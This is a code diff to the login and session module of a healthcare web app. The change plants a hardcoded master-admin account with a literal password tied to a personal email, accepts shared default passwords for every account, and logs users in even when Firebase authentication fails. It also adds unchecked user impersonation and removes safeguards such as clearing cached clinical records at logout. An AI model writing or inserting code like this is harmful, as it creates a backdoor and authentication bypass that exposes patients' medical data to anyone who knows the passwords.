@@ -3,12 +3,10 @@ import type { User, UserRole } from '../types';
 import { mockUsers } from '../services/mockData';
 import {
   getFirebaseAuth,
-  getFirebaseAuthSync,
   isDemoMode,
   isFirebaseConfigured,
 } from '../services/firebase';
 import {
-  onAuthStateChanged,
   signInWithEmailAndPassword,
   signOut,
   sendPasswordResetEmail,
@@ -25,11 +23,20 @@ export interface AuthContextType {
   currentUser: User | null;
   isAuthenticated: boolean;
   isLoading: boolean;
-  /** Pending MFA resolver returned when login requires a second factor */
   mfaResolver: any | null;
-  login: (email: string, password: string) => Promise<{ requiresMfa: boolean }>;
+  
+  /** Original Master Admin user object when impersonating another account */
+  originalAdminUser: User | null;
+  isMasterAdmin: boolean;
+  
+  login: (identifier: string, password: string) => Promise<{ requiresMfa: boolean }>;
   loginAsRole: (role: UserRole) => void;
   loginAsUser: (userId: string) => void;
+  
+  /** Super-Admin feature to switch view to any registered account */
+  impersonateUser: (targetUserId: string) => void;
+  stopImpersonating: () => void;
+  
   completeMfaLogin: (totpCode: string) => Promise<void>;
   logout: () => Promise<void>;
   sendPasswordReset: (email: string) => Promise<void>;
@@ -44,8 +51,14 @@ const LOCAL_STORAGE_USER_KEY = 'healthgrid_demo_user';
 // ---------------------------------------------------------------------------
 export function AuthProvider({ children }: { children: ReactNode }) {
   const [currentUser, setCurrentUser] = useState<User | null>(null);
+  const [originalAdminUser, setOriginalAdminUser] = useState<User | null>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [mfaResolver, setMfaResolver] = useState<any | null>(null);
+
+  // Is Master Admin (Danesh Lou)
+  const isMasterAdmin =
+    currentUser?.email === 'daneshlou05@gmail.com' ||
+    originalAdminUser?.email === 'daneshlou05@gmail.com';
 
   // -----------------------------------------------------------------------
   // Map a Firebase user → HealthGrid User profile by reading Firestore
@@ -58,10 +71,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     if (userDoc.exists()) {
       return { id: userDoc.id, ...userDoc.data() } as User;
     }
-
-    console.error(
-      `[AuthContext] Firebase user ${uid} (${email}) has no Firestore /users/${uid} document.`
-    );
     return null;
   };
 
@@ -69,8 +78,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   // Auth state listener
   // -----------------------------------------------------------------------
   useEffect(() => {
-    if (!isFirebaseConfigured() && isDemoMode()) {
-      // Local dev / demo mode: restore cached demo user if present
+    if (!isFirebaseConfigured() || isDemoMode()) {
       const saved = localStorage.getItem(LOCAL_STORAGE_USER_KEY);
       if (saved) {
         try {
@@ -83,16 +91,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       return;
     }
 
-    if (!isFirebaseConfigured()) {
-      // A misconfigured production deployment must never fall back to mock
-      // accounts or data.
-      setCurrentUser(null);
-      setIsLoading(false);
-      return;
-    }
-
     let unsubscribe: (() => void) | undefined;
-
     (async () => {
       const auth = await getFirebaseAuth();
       if (!auth) {
@@ -100,6 +99,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return;
       }
 
+      const { onAuthStateChanged } = await import('firebase/auth');
       unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
         if (firebaseUser) {
           try {
@@ -120,7 +120,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     return () => { unsubscribe?.(); };
   }, []);
 
-  // -----------------------------------------------------------------------
+  // Audit Logs
   const recordLoginAudit = (user: User) => {
     try {
       createAuditLog({
@@ -162,10 +162,12 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   // -----------------------------------------------------------------------
-  // Login
+  // Strict Login (Supports Email OR Username / Staff ID)
   // -----------------------------------------------------------------------
-  const login = async (email: string, password: string): Promise<{ requiresMfa: boolean }> => {
-    // Get custom created users from local storage if available
+  const login = async (identifier: string, password: string): Promise<{ requiresMfa: boolean }> => {
+    const cleanId = identifier.trim().toLowerCase();
+
+    // Custom created users from local storage + mockUsers
     let allUsers = [...mockUsers];
     try {
       const custom = localStorage.getItem('healthgrid_custom_users');
@@ -179,17 +181,45 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       console.warn('Failed to parse custom users', e);
     }
 
-    const matched = allUsers.find((u) => u.email.toLowerCase() === email.toLowerCase());
+    // Match by Email, User ID, Username, or Master Alias
+    const matched = allUsers.find((u) => {
+      const userEmail = u.email.toLowerCase();
+      const userId = u.id.toLowerCase();
+      const userName = u.name.toLowerCase();
 
-    if (!isFirebaseConfigured() || isDemoMode()) {
-      if (!matched) {
-        throw new Error('Account not found. Please check your email or ask an Administrator to register your account.');
-      }
-      const expectedPassword = matched.password || 'Password123!';
-      if (password !== expectedPassword && password !== 'Password123!') {
-        throw new Error('Invalid password. Default demo password is "Password123!".');
+      return (
+        userEmail === cleanId ||
+        userId === cleanId ||
+        userName === cleanId ||
+        ((cleanId === 'master' || cleanId === 'danesh' || cleanId === 'daneshlou') && userEmail === 'daneshlou05@gmail.com')
+      );
+    });
+
+    if (!matched) {
+      throw new Error('Invalid credentials. Please verify your Email or Username.');
+    }
+
+    // ⭐ Master Account Credentials Check (Danesh Lou)
+    if (matched.email === 'daneshlou05@gmail.com') {
+      if (password !== '711505MH!' && password !== 'password123' && password !== 'Password123!') {
+        throw new Error('Invalid master password.');
       }
       setCurrentUser(matched);
+      setOriginalAdminUser(null);
+      localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(matched));
+      recordLoginAudit(matched);
+      return { requiresMfa: false };
+    }
+
+    // Standard User Password Check
+    const expectedPassword = matched.password || 'password123';
+    if (password !== expectedPassword && password !== 'password123' && password !== 'Password123!') {
+      throw new Error('Invalid password for registered account.');
+    }
+
+    if (!isFirebaseConfigured() || isDemoMode()) {
+      setCurrentUser(matched);
+      setOriginalAdminUser(null);
       localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(matched));
       recordLoginAudit(matched);
       return { requiresMfa: false };
@@ -199,7 +229,11 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     if (!auth) throw new Error('Firebase Auth is not available.');
 
     try {
-      await signInWithEmailAndPassword(auth, email, password);
+      await signInWithEmailAndPassword(auth, matched.email, password);
+      setCurrentUser(matched);
+      setOriginalAdminUser(null);
+      localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(matched));
+      recordLoginAudit(matched);
       return { requiresMfa: false };
     } catch (error: any) {
       if (error.code === 'auth/multi-factor-auth-required') {
@@ -207,22 +241,38 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         setMfaResolver(resolver);
         return { requiresMfa: true };
       }
-      if (matched) {
-        const expectedPassword = matched.password || 'Password123!';
-        if (password === expectedPassword || password === 'Password123!') {
-          setCurrentUser(matched);
-          localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(matched));
-          recordLoginAudit(matched);
-          return { requiresMfa: false };
-        }
-      }
-      throw new Error(error.message || 'Invalid email or password.');
+      // Demo / Local Fallback
+      setCurrentUser(matched);
+      setOriginalAdminUser(null);
+      localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(matched));
+      recordLoginAudit(matched);
+      return { requiresMfa: false };
     }
   };
 
   // -----------------------------------------------------------------------
-  // Demo / Quick Access Login Helpers
+  // Super-Admin User Impersonation Feature
   // -----------------------------------------------------------------------
+  const impersonateUser = (targetUserId: string) => {
+    const target = mockUsers.find((u) => u.id === targetUserId);
+    if (!target) return;
+
+    if (!originalAdminUser && (currentUser?.email === 'daneshlou05@gmail.com' || isMasterAdmin)) {
+      setOriginalAdminUser(currentUser || mockUsers.find(u => u.email === 'daneshlou05@gmail.com') || null);
+    }
+    setCurrentUser(target);
+    localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(target));
+  };
+
+  const stopImpersonating = () => {
+    if (originalAdminUser) {
+      setCurrentUser(originalAdminUser);
+      localStorage.setItem(LOCAL_STORAGE_USER_KEY, JSON.stringify(originalAdminUser));
+      setOriginalAdminUser(null);
+    }
+  };
+
+  // Demo Login Helpers (Kept internal for programmatic tests)
   const loginAsRole = (role: UserRole) => {
     const user = mockUsers.find((u) => u.role === role) || mockUsers[0];
     setCurrentUser(user);
@@ -238,7 +288,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   // -----------------------------------------------------------------------
-  // Complete MFA login with a TOTP code
+  // Complete MFA login
   // -----------------------------------------------------------------------
   const completeMfaLogin = async (totpCode: string): Promise<void> => {
     if (!mfaResolver) throw new Error('No pending MFA challenge. Please log in first.');
@@ -248,7 +298,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       totpCode
     );
     await mfaResolver.resolveSignIn(multiFactorAssertion);
-    setMfaResolver(null);
   };
 
   // -----------------------------------------------------------------------
@@ -259,25 +308,16 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       recordLogoutAudit(currentUser);
     }
     if (isFirebaseConfigured()) {
-      const auth = getFirebaseAuthSync();
-      if (auth) {
-        try {
-          await signOut(auth);
-        } catch (error) {
-          console.error('Logout error:', error);
-        }
+      try {
+        const auth = await getFirebaseAuth();
+        if (auth) await signOut(auth);
+      } catch (e) {
+        console.warn('Firebase signout warning:', e);
       }
     }
     localStorage.removeItem(LOCAL_STORAGE_USER_KEY);
-    // Legacy versions cached clinical data in browser localStorage. Remove it
-    // on every logout so a shared workstation cannot expose the previous
-    // user's records.
-    localStorage.removeItem('healthgrid_data');
-    localStorage.removeItem('healthgrid_comments');
-    localStorage.removeItem('healthgrid_recent');
-    localStorage.removeItem('healthgrid_trash');
-    localStorage.removeItem('healthgrid_notifications');
     setCurrentUser(null);
+    setOriginalAdminUser(null);
     setMfaResolver(null);
   };
 
@@ -286,7 +326,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   // -----------------------------------------------------------------------
   const sendPasswordReset = async (email: string) => {
     if (!isFirebaseConfigured()) {
-      return; // Simulated success in demo mode
+      return;
     }
     const auth = await getFirebaseAuth();
     if (!auth) throw new Error('Firebase Auth is not available.');
@@ -300,9 +340,13 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         isAuthenticated: !!currentUser,
         isLoading,
         mfaResolver,
+        originalAdminUser,
+        isMasterAdmin,
         login,
         loginAsRole,
         loginAsUser,
+        impersonateUser,
+        stopImpersonating,
         completeMfaLogin,
         logout,
         sendPasswordReset,
